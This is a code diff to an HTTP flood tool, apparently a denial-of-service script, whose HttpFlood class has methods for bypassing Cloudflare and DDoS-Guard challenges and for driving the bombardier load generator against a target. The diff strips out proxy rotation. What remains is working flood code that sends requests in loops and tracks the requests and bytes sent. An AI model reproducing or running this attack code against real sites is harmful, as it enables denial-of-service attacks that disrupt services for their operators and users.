@@ -847,8 +847,6 @@ class HttpFlood(Thread):
                 ",https://www.google.com/translate?u="
             ]
         self._referers = list(referers)
-        if proxies:
-            self._proxies = list(proxies)
 
         if not useragents:
             useragents: List[str] = [
@@ -935,11 +933,7 @@ class HttpFlood(Thread):
                            "\r\n"))
 
     def open_connection(self, host=None) -> socket:
-        if self._proxies:
-            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
-        else:
-            sock = socket(AF_INET, SOCK_STREAM)
-
+        sock = socket(AF_INET, SOCK_STREAM)
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         sock.settimeout(.9)
         sock.connect(host or self._raw_target)
@@ -1113,19 +1107,9 @@ class HttpFlood(Thread):
 
     def CFB(self):
         global REQUESTS_SENT, BYTES_SEND
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
         s = None
         with suppress(Exception), create_scraper() as s:
             for _ in range(self._rpc):
-                if pro:
-                    with s.get(self._target.human_repr(),
-                               proxies=pro.asRequest()) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
-                        continue
-
                 with s.get(self._target.human_repr()) as res:
                     REQUESTS_SENT += 1
                     BYTES_SEND += Tools.sizeOfRequest(res)
@@ -1155,26 +1139,12 @@ class HttpFlood(Thread):
     def DGB(self):
         global REQUESTS_SENT, BYTES_SEND
         with suppress(Exception):
-            if self._proxies:
-                pro = randchoice(self._proxies)
-                with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), pro.asRequest()) as ss:
-                    for _ in range(min(self._rpc, 5)):
-                        sleep(min(self._rpc, 5) / 100)
-                        with ss.get(self._target.human_repr(),
-                                    proxies=pro.asRequest()) as res:
-                            REQUESTS_SENT += 1
-                            BYTES_SEND += Tools.sizeOfRequest(res)
-                            continue
-
-                Tools.safe_close(ss)
-
             with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents)) as ss:
                 for _ in range(min(self._rpc, 5)):
                     sleep(min(self._rpc, 5) / 100)
                     with ss.get(self._target.human_repr()) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
-
             Tools.safe_close(ss)
 
     def DYN(self):
@@ -1205,19 +1175,9 @@ class HttpFlood(Thread):
 
     def BYPASS(self):
         global REQUESTS_SENT, BYTES_SEND
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
         s = None
         with suppress(Exception), Session() as s:
             for _ in range(self._rpc):
-                if pro:
-                    with s.get(self._target.human_repr(),
-                               proxies=pro.asRequest()) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
-                        continue
-
                 with s.get(self._target.human_repr()) as res:
                     REQUESTS_SENT += 1
                     BYTES_SEND += Tools.sizeOfRequest(res)
@@ -1322,15 +1282,7 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def BOMB(self):
-        # assert self._proxies, \
-         #  'This method requires proxies. ' \
-          #  'Without proxies you can use github.com/codesenberg/bombardier'
-
-        while True:
-            proxy = randchoice(self._proxies)
-            if proxy.type != ProxyType.SOCKS4:
-                break
-
+        global REQUESTS_SENT, BYTES_SEND
         res = run(
             [
                 f'{bombardier_path}',
@@ -1340,13 +1292,12 @@ class HttpFlood(Thread):
                 '--latencies',
                 '--timeout=30s',
                 f'--requests={self._rpc}',
-                f'--proxy={proxy}',
                 f'{self._target.human_repr()}',
             ],
             stdout=PIPE,
         )
         if self._thread_id == 0:
-            print(proxy, res.stdout.decode(), sep='\n')
+            print(res.stdout.decode())
 
     def SLOW(self):
         payload: bytes = self.generate_payload()
